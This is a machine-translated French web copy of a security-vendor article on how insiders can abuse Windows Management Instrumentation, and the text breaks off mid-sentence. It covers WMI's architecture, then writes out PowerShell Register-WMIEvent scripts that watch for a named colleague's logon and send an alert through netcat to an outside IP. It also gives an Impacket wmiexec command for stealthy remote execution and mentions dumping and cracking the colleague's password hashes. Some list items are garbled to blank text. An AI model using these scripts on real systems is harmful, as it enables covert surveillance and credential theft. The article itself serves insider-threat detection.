<!doctype html>
<html class="no-js" lang="fr">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üßõüèª üé≥ üëÜüèª Guide de Windows Management Instrumentation (WMI): Comprendre les attaques WMI üò∂ üëãüèæ üë®‚Äçüè≠</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Windows Management Instrumentation (WMI) est un sous-syst√®me PowerShell qui permet aux administrateurs d'acc√©der √† de puissants outils de surveillance...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Guide de Windows Management Instrumentation (WMI): Comprendre les attaques WMI</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/507068/"><img src="https://habrastorage.org/webt/wm/nj/qv/wmnjqvqbgcfcfxcp3omsbeuk4xi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Windows Management Instrumentation (WMI) est un sous-syst√®me PowerShell qui permet aux administrateurs d'acc√©der √† de puissants outils de surveillance du syst√®me. Cette bo√Æte √† outils a √©t√© con√ßue comme un outil d'administration syst√®me rapide et efficace, mais tout le monde ne l'utilise pas √† de bonnes fins: avec son aide, les initi√©s peuvent espionner d'autres employ√©s. La connaissance de cette vuln√©rabilit√© WMI facilite la d√©tection et la lutte contre les menaces internes. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans cet article, nous examinerons ce que sont les outils WMI, pourquoi ils sont n√©cessaires et comment ils peuvent √™tre utilis√©s pour suivre l'activit√© des initi√©s dans le syst√®me. Nous avons √©galement compil√© un guide plus d√©taill√© sur les √©v√©nements WMI et l'espionnage d'initi√©, que vous pouvez </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">t√©l√©charger gratuitement.</font></font></a><br>
<a name="habracut"></a><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Br√®ve revue: qu'est-ce que le WMI et √† quoi sert-il?</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/0t/au/hp/0tauhpqfa_9fk8xebbdasj4e3je.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous donnons un exemple concret. </font><font style="vertical-align: inherit;">√Ä l'aide de WMI, vous pouvez demander, par exemple, tous les gros fichiers Excel situ√©s dans un r√©pertoire particulier, puis recevoir une notification chaque fois que vous cr√©ez un fichier avec une taille donn√©e, par exemple 1 Mo. </font><font style="vertical-align: inherit;">La </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet Register-WmiEvent vous</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> permet de faire tout cela avec une seule ligne, pas trop compliqu√©e dans PowerShell. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Entre de bonnes mains, WMI peut servir plusieurs objectifs, mais il peut √©galement devenir un outil pour les activit√©s d'initi√©s malveillants. </font><font style="vertical-align: inherit;">Vous pouvez facilement imaginer comment une personne avec les habitudes d'Edward Snowden utilise WMI pour espionner ses coll√®gues. </font><font style="vertical-align: inherit;">Pour ce faire, il n'a m√™me pas besoin de connaissances techniques particuli√®res.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Supposons que notre initi√© hypoth√©tique espionne ¬´accidentellement¬ª que son coll√®gue Lex t√©l√©charge p√©riodiquement de gros fichiers Excel contenant les num√©ros de s√©curit√© sociale et d'autres donn√©es personnelles des clients. </font><font style="vertical-align: inherit;">Dans ce cas, notre initi√© discret peut construire quelque chose comme ceci:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WmiEvent -Query "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance isa 'CIM_DataFile' and TargetInstance.FileSize &gt; 2000000 and TargetInstance.Path = '\\Users\\lex\\Important' and targetInstance.Drive = 'C:‚Äô and targetInstance.Extension =‚Äôxlsx‚Äô‚Äù -Action $action </code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ce code interroge l'objet </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CIM_DataFile</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> pour acc√©der aux informations sur la cr√©ation du fichier Excel dans le r√©pertoire sp√©cifi√©, puis d√©marre l'ex√©cution du bloc de script. </font><font style="vertical-align: inherit;">Vers la fin de cet article, nous allons voir de plus pr√®s √† quoi pourrait ressembler ce bloc de sc√©nario dans le cas de notre initi√© hypoth√©tique.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">√Ä quoi sert le Windows Management Toolkit?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Avant de continuer √† explorer comment WMI peut √™tre utilis√© par des initi√©s √† des fins de suivi, il convient de noter qu'il a de nombreuses utilisations l√©gitimes. </font><font style="vertical-align: inherit;">L'objectif global de ce syst√®me est de rassembler tous les contr√¥les des appareils et des applications dans les r√©seaux d'entreprise. </font><font style="vertical-align: inherit;">Ainsi, WMI peut √™tre utilis√©:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> pour collecter des informations sur l'√©tat des syst√®mes informatiques locaux et distants </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">param√®tres de s√©curit√© pour les ordinateurs et applications distants</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">d√©finition et modification des propri√©t√©s syst√®me</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">d√©finition et modification des autorisations pour les utilisateurs et les groupes autoris√©s</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ex√©cution de code et s√©rialisation d'objets (une </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sorte de "SSH sur les st√©ro√Ødes"</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">attribuer et modifier des √©tiquettes de lecteur</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cr√©ation d'un calendrier de processus</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">r√©f√©rentiels d'objets de sauvegarde</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">activer et d√©sactiver la journalisation des erreurs</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Toutes ces fonctionnalit√©s sont accessibles √† l'aide de PowerShell et WMIC, l'interface de ligne de commande WMI. </font><font style="vertical-align: inherit;">Comme vous pouvez le voir, WMI a une grande vari√©t√© d'applications, et ce syst√®me vous permet de suivre et de modifier de nombreux param√®tres diff√©rents sur un r√©seau informatique.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Architecture d'instrumentation de gestion Windows</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/2w/tf/ij/2wtfijgpvxpx9nijaapuk9a74gg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La bo√Æte √† outils WMI fait partie du syst√®me d'exploitation Windows et est pr√©install√©e sur tous les syst√®mes d'exploitation √† partir de Windows 2000. WMI comprend les composants suivants:</font></font><br>
<br>
<ul>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Le service WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> est une impl√©mentation du syst√®me WMI sous Windows. </font><font style="vertical-align: inherit;">Ce processus appara√Æt sous le nom ¬´Windows Management Instrumentation¬ª et constitue le lien entre les fournisseurs WMI, le r√©f√©rentiel WMI et les applications de gestion. </font><font style="vertical-align: inherit;">Ce processus d√©marre automatiquement lorsque vous allumez l'ordinateur.</font></font></li>
<li><strong> </strong> ‚Äî        ,      WMI.        ,  WMI        ,       Windows,    .</li>
<li><strong> WMI </strong> ‚Äî  ,       .      WMI   ,      .        Windows.</li>
<li><strong> </strong>  WMI     WMI.      ,     .   WMI       .</li>
<li><strong></strong>,     ,         . ,           .              .</li>
<li><strong> WMI</strong> ‚Äî   ,      ,   WMI.      .         WMI.</li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Le gestionnaire d'objets CMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> est un syst√®me qui se situe entre l'application de gestion et les fournisseurs WMI. </font><font style="vertical-align: inherit;">Elle demande des donn√©es √† ces fournisseurs, puis les transf√®re √† l'application.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">L'API WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> effectue ces op√©rations et fournit aux applications un acc√®s √† l'infrastructure WMI sans √™tre li√© au type de p√©riph√©rique utilis√©.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Un consommateur WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> est une entit√© qui envoie des requ√™tes aux objets via le gestionnaire d'objets. </font><font style="vertical-align: inherit;">En r√®gle g√©n√©rale, un consommateur WMI est une application de surveillance, telle que le moniteur r√©seau PRTG, ex√©cutant l'application ou un script PowerShell.</font></font></li>
</ul><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Faire des demandes WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La fa√ßon la plus simple d'ex√©cuter une demande WMI consiste √† ex√©cuter WMIC sur une ligne de commande Windows standard. </font><font style="vertical-align: inherit;">Suivez ces √©tapes pour obtenir des informations sur le processeur utilis√© sur l'ordinateur local:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ouvrir l'invite de commande</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tapez WMIC pour appeler le programme et appuyez sur Entr√©e </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">La fen√™tre d'invite de commande WMIC appara√Æt.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">√Ä l'invite de commandes, vous pouvez ex√©cuter des demandes WMI. </font><font style="vertical-align: inherit;">La demande la plus simple consiste √† afficher des informations sur le processeur local, qui peuvent √™tre effectu√©es √† l'aide de la commande suivante:</font></font><br>
<pre><code class="plaintext hljs">WMIC CPU</code></pre><br>
</li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Les r√©sultats seront affich√©s sur la ligne de commande.</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Presque toutes les commandes qui seront discut√©es ci-dessous sont ex√©cut√©es de cette mani√®re. </font><font style="vertical-align: inherit;">Cependant, WMI vous permet de recevoir des informations beaucoup plus d√©taill√©es que les informations sur le processeur, y compris des ordinateurs et applications distants.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Atelier sur l'utilisation des √©v√©nements WMI pour surveiller un syst√®me</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans cette section, nous verrons comment utiliser WMI pour ex√©cuter des commandes et surveiller les processus sur des ordinateurs distants. </font><font style="vertical-align: inherit;">Ces techniques peuvent √™tre utilis√©es dans le cadre </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">du syst√®me d'analyse du comportement des utilisateurs et des entit√©s (UEBA)</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> pour surveiller automatiquement les processus dans tout le syst√®me et </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rechercher les menaces internes</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , qui sont mises en √©vidence par un comportement suspect ou des √©v√©nements anormaux.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Utilisation de la fonctionnalit√© wmiexec d'Impacket</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans WMI, vous pouvez ex√©cuter diverses fonctions en plus de la gestion des √©v√©nements. Dans celui-ci, vous pouvez d√©marrer des processus et ex√©cuter des commandes dans des fen√™tres Windows sur des ordinateurs locaux et distants. Pour le plaisir, essayez d'entrer la commande </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> appelez create 'notepad.exe' dans une session PowerShell pour ouvrir l'ancien √©diteur de texte Microsoft. Il utilise le merveilleux outil de ligne de commande wmic inclus avec WMI. Super, non? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si j'ai ajout√© l'option / Node:, puis le nom de l'ordinateur Windows distant, je pourrais ex√©cuter le Bloc-notes sur celui-ci, √† condition que je dispose des autorisations appropri√©es. Il est clair qu'au niveau pratique, wmic est un outil indispensable pour les administrateurs syst√®me.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Avant de commencer √† vous en vouloir: je sais qu'il existe des </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">applets de commande PowerShell</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> √©quivalentes </font><font style="vertical-align: inherit;">. Cependant, je trouve la syntaxe wmic plus facile √† retenir. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ce serait formidable si je pouvais utiliser WMI pour cr√©er un pseudo-shell simple et invisible.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/gu/nl/1j/gunl1jzoplcyeo2axlgjwd6bifw.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Un pseudo-shell cach√© cr√©√© avec wmiexec. </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
√Ä ma chance, cela peut √™tre fait dans Impacket. Dans l'environnement de test Amazon, j'ai utilis√© mon </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmiexec</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> pr√©f√©r√© </font><font style="vertical-align: inherit;">pour acc√©der √† WMI via la machine virtuelle Linux. Wmiexec offre la possibilit√© de cr√©er un pseudo-shell: chaque fois qu'une commande est entr√©e c√¥t√© client, un shell s√©par√© est cr√©√© sur l'ordinateur cible pour ex√©cuter cette commande. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Psexec et smbexec utilisent les services Windows pour ex√©cuter des commandes sur un syst√®me distant. Smbexec s'ex√©cute en silence, car il cr√©e et supprime rapidement un service, et psexec, en revanche, le laisse en vue.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/vk/mb/ik/vkmbiktrjf4cn49ihyxvhp12u0w.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 L'outil wmiexec ex√©cute directement cmd.exe pour ex√©cuter la commande √† distance. </font><font style="vertical-align: inherit;">La commande cr√©√©e se trouve dans l'Observateur d'√©v√©nements. </font><font style="vertical-align: inherit;">Notez que nous avons √©vit√© les services Windows qui attirent l'attention. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L'outil wmiexec n'affecte pas du tout les services, mais utilise les fonctionnalit√©s WMI d√©crites ci-dessus pour d√©marrer directement le processus. </font><font style="vertical-align: inherit;">Lorsqu'ils recherchent des sources possibles de menaces, les experts en s√©curit√© commencent rarement par WMI, tandis que les services sont g√©n√©ralement un bon endroit pour commencer √† rechercher des preuves d'une attaque. </font><font style="vertical-align: inherit;">Bon mouvement, wmiexec!</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Utilisation des √©v√©nements WMI pour surveiller les utilisateurs</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Alors que je m'amusais avec l'id√©e que j'√©tais si intelligent et que j'exp√©rimentais avec WMI, il s'est av√©r√© que les gars impliqu√©s dans les tests de p√©n√©tration avaient depuis longtemps compris comment tout fonctionnait. Vous devriez certainement lire </font><font style="vertical-align: inherit;">la </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pr√©sentation</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> √©tonnante de </font><font style="vertical-align: inherit;">Matt Graeber de la conf√©rence Black Hat 2015, o√π il explique comment les attaquants peuvent transformer WMI et tout son arsenal d'√©v√©nements en un outil de piratage. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans mon histoire, j'imagine un initi√© √† la Snowden qui a des connaissances techniques, mais pas une profonde sagesse de piratage, et qui fait confiance aux autres employ√©s. Cette personne n'a pas besoin de tout savoir sur WMI. Il doit seulement savoir ce qui est n√©cessaire pour travailler sur un ordinateur distant et d√©clencher des √©v√©nements.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En plus des objets fichier, il existe une autre classe int√©ressante d'objets qui peuvent √™tre appris √† l'aide de WMI, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">win32_LogOnSession</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . L'interrogation de cet objet Windows de base vous permet de trouver les utilisateurs qui sont actuellement sur le syst√®me. Vous pouvez ensuite utiliser le bloc de script d'action Register-WmiEvent pour ex√©cuter le script PowerShell lorsqu'un nouvel utilisateur se connecte √† distance. Vous avez compris? Un attaquant peut recevoir des notifications chaque fois qu'un utilisateur qu'il surveille se connecte au syst√®me cible. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voici ce que j'ai esquiss√©:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" ‚ÄìAction $action</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La question suivante est de savoir comment programmer l'ex√©cution d'un bloc de script. Un myst√©rieux initi√© de mes fantasmes s'int√©resse √† un utilisateur sp√©cifique - Cruell. Notre m√©chante espionnait lentement Cruella et pr√©voit maintenant d'utiliser les informations collect√©es pour pirater son compte de travail. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La t√¢che du bloc de script est de v√©rifier qui est connect√© et de d√©terminer s'il s'agissait de Cruella. J'ai √©crit quelques lignes de code PowerShell √† cet effet, mais ce n'est clairement pas la meilleure fa√ßon. Je n'utilise pas les informations d'√©v√©nement transmises au bloc de script, √† savoir les informations sur le nouvel utilisateur. Je rencontre des obstacles dont je ne comprends pas les raisons pour le moment. Cela n√©cessite plus de connaissances techniques que notre hypoth√©tique initi√© a ou est pr√™t √† acqu√©rir.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Au lieu de cela, j'ai simplement parcouru la liste des utilisateurs retourn√©s par gwmi Win32_Process (essayez d'ex√©cuter cette applet de commande dans une session PowerShell) et les ai mis en correspondance avec le param√®tre Cruell. </font><font style="vertical-align: inherit;">Vous pouvez admirer ma d√©cision finale:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {<font></font>
<font></font>
$names=gwmi Win32_Process|% { $_.GetOwner().User}<font></font>
foreach ($user in $names){<font></font>
<font></font>
    if ($user -eq "cruella") {<font></font>
<font></font>
        echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80<font></font>
    }<font></font>
}<font></font>
<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Register-WmiEvent vous permet de maintenir la furtivit√©, car il ne d√©marre que lorsque vous vous connectez √† nouveau, au lieu de demander r√©guli√®rement l'objet Win32_Process, ce qui peut √™tre assez visible. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
N'oubliez pas que notre initi√© essaie de ne pas attirer l'attention. </font><font style="vertical-align: inherit;">Elle a acc√®s au syst√®me distant via psexec, smbexec ou wmiexec (la mani√®re la plus discr√®te). </font><font style="vertical-align: inherit;">Cependant, elle n'a pas besoin de se d√©placer constamment dans les deux sens autour du syst√®me de la victime. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
C'est la beaut√© de l'utilisation des √©v√©nements WMI. </font><font style="vertical-align: inherit;">Vous pouvez attendre la notification de Register-WmiEvent, puis proc√©der calmement.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Int√©gration Netcat et WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais comment le script apporte-t-il la nouvelle br√ªlante que Cruella est connect√© √† l'ordinateur cible? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si vous remarquez que j'ai utilis√© les commandes Netcat ci-dessus, vous pouvez vous donner un plus. </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> est un utilitaire bien connu et universel qui vous permet d'√©tablir des connexions (facultatif pour les logiciels malveillants). Avec lui, vous pouvez effectuer une connexion inverse ou simplement envoyer des messages sur le r√©seau. J'ai saisi cette deuxi√®me opportunit√©. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le script ci-dessus envoie un message Netcat en mode veille et affiche ¬´Cruella connect√©¬ª. Mission accomplie. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous pouvez imaginer comment notre escroc </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;">vide</font></a><font style="vertical-align: inherit;"> les hachages avec l' </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">outil secretsdump Impacket</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, crackez le hachage des informations d'identification Cruella, puis lancez wmiexec, √† l'aide des autorisations Cruella, pour rechercher des donn√©es plus pr√©cieuses.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ca/en/ni/caennizhyw6u4_yuldedujkbowa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Le code Register-WmiEvent peut √™tre ex√©cut√© directement. </font><font style="vertical-align: inherit;">Faites attention √† l'identifiant d'√©v√©nement affich√©</font></font><br>
 <br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">D√©pannage de la surveillance WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans le cadre de cet exemple, je voulais ex√©cuter √† distance (√† l'aide de wmiexec) un programme utile qui m'alerterait lorsqu'un utilisateur particulier, c'est-√†-dire Cruella, se connecte. Apr√®s cela, j'ai pu r√©initialiser et casser ses informations d'identification en toute s√©curit√©. Ce serait le moyen le plus discret - acc√®s √† distance et aucun fichier. Le seul probl√®me, il m'a sembl√© au d√©but, √©tait le caract√®re temporaire des √©v√©nements WMI. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Par cons√©quent, je devais inclure mon long registre-WMIEvent obsc√®ne (ci-dessous) dans la ligne de commande PowerShell avec le param√®tre ‚Äìnoexit, qui garantit que la session PowerShell est enregistr√©e apr√®s Register-Event et, par cons√©quent, l'√©v√©nement est enregistr√©.</font></font><br>
<br>
<pre><code class="plaintext hljs"> Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {$names=gwmi Win32_Process|% { $_.GetOwner().User};foreach ($user in $names){if ($user -eq "cruella") {echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80}}}
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Quand j'ai commenc√© √† travailler l√†-dessus, j'ai r√©alis√© que je devais "convertir" des caract√®res sp√©ciaux tels que $, "et |, et les passer directement sous forme de litt√©raux √† PowerShell. </font><font style="vertical-align: inherit;">Autre casse-t√™te: j'ai fini par devoir abandonner l'utilisation des lignes verticales car elles provoquaient des erreurs d'analyse. </font><font style="vertical-align: inherit;">Ne demandez pas. </font><font style="vertical-align: inherit;">Peu √† peu, je suis arriv√© √† cette longue ligne de code:</font></font><br>
<br>
<pre><code class="plaintext hljs">$command="powershell -noexit -C Register-WMIEvent -Query ""Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3"" -Action {`$names = gwmi Win32_Process; `$users=@(); foreach (`$n in `$names) {`$users += `$n.GetOwner().User}; foreach (`$u in `$users) {if (`$u -eq ""cruella"") {.\wmiexec C:\Users\lex\Documents\nc.exe 172.31.18.92 80 }}}<font></font>
.\wmiexec.exe corp.acme/lex@172.31.46.115 "$command"<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
